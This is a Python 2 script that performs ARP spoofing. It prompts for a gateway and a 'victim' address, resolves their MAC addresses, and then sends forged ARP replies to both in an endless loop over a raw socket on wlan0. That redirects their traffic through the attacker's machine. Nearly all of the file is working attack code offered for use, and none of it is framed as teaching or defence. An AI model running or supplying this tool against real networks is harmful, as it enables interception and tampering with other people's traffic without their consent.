import os
import collections
import platform
import socket, subprocess, sys
import threading
from datetime import datetime
import struct
import binascii
from uuid import getnode as get_mac
from subprocess import Popen, PIPE
import re

def isAlive(ip) :
    return True
    addr = ip
    comm = ping1+addr
    response = os.popen(comm)
    for line in response.readlines():
        if(line.count("ttl")):
           break
    if (line.count("ttl")):
	return True
    else :
	return False

def getMAC(ip) :
    pid = Popen(["arp", "-n", ip], stdout=PIPE)
    g = pid.communicate()[0]
    response = re.search(r"(([a-f\d]{1,2}\:){5}[a-f\d]{1,2})", g).groups()[0]
    victimMAC = response
    victimMAC = victimMAC.replace(":","")
    return victimMAC

def seperateMAC(mac) :
    i=0
    strBuilder = ''
    while(i+1 <= len(mac)) :
        #strBuilder = strBuilder + r'\x' +mac[i:i+2]
	strBuilder = strBuilder +mac[i:i+2]
	i +=2
    return binascii.a2b_hex(strBuilder)

sor = str(hex(get_mac()))
sor = sor[:-1]
if(len(sor) <= 13) :
    sor = '0' + sor[2:]
else :
    sor = sor[2:]
test = "sor : "+ '\x8c\x89\xa5\x0a\xd8\x0c'
test1 = "vic : " +'\x08\x08\xc2\x1b\x41\xc9'
test2 = "gate : "+'\x00\x22\x75\x94\x4c\x73'
print test
print test1
print test2
sor = seperateMAC(sor)
print sor
s = socket.socket(socket.PF_PACKET, socket.SOCK_RAW, socket.ntohs(0x0800))
s.bind(("wlan0",socket.htons(0x0800)))

code ='\x08\x06'
htype = '\x00\x01'
protype = '\x08\x00'
hsize = '\x06'
psize = '\x04'
opcode = '\x00\x02'
'''section 1'''

gate_IP = raw_input("Enter the Gateway address : ")
vic_IP = raw_input("Enter the victim's address : ")

dic = collections.OrderedDict()
oper = platform.system()

if(oper == 'Windows'):
    ping1 = "ping -n 1 "
elif (oper == 'Linux'):
    ping1 = "ping -c 1 "
else :
    ping1 = "ping -c 1 "

if isAlive(vic_IP) :
    vic_MAC = getMAC(vic_IP)
    gate_MAC = getMAC(gate_IP)
    print vic_IP + " | MAC address --> " + vic_MAC
    print gate_IP + " | MAC address --> " + gate_MAC

    vic_MAC = seperateMAC(vic_MAC)
    gate_MAC = seperateMAC(gate_MAC)
    print " MAC address --> " + vic_MAC
    print " MAC address --> " + gate_MAC

    gip = socket.inet_aton ( gate_IP )
    vip = socket.inet_aton ( vic_IP )

    eth1 = vic_MAC+sor+code #for victim
    eth2 = gate_MAC +sor+code #for gateway
    
    arp_victim = eth1+htype+protype+hsize+psize+opcode+sor+gip+vic_MAC+vip
    arp_gateway= eth2+htype+protype+hsize+psize+opcode+sor+vip+gate_MAC+gip
    print "vic : " + arp_victim
    print "gate : " + arp_gateway
    while 1:
        s.send(arp_victim)
        s.send(arp_gateway)
else : 
    print "That ip is not valid..."
    quit()






   
